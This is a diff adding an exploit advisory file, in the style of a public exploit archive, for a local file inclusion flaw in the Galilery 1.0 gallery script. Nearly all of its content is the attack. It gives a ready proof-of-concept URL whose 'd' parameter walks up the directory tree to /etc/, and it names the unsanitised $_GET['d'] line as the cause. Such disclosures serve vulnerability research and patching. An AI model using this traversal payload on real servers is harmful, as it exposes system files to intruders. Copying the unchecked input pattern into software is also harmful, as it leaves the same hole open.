@@ -1,0 +1,19 @@
+$ cat 15_lfi_galilery.1.0.txt
+# exploit title: local file include in Galilery 1.0
+# date: 18.o2.2o11
+# author: lemlajt
+# software : Galilery
+# version: 1.0
+# tested on: linux
+# cve :
+# http://ftp.heanet.ie/disk1/sourceforge/g/project/ga/galilery/Galilery/
+
+
+PoC :
+
+http://localhost/www/cmsadmins/Galilery-1.0/index.php?pg=1&d=../../../../../../../../../../../../etc/
+
+cuz:
+index.php: $d=$_GET['d'];
+
+# *
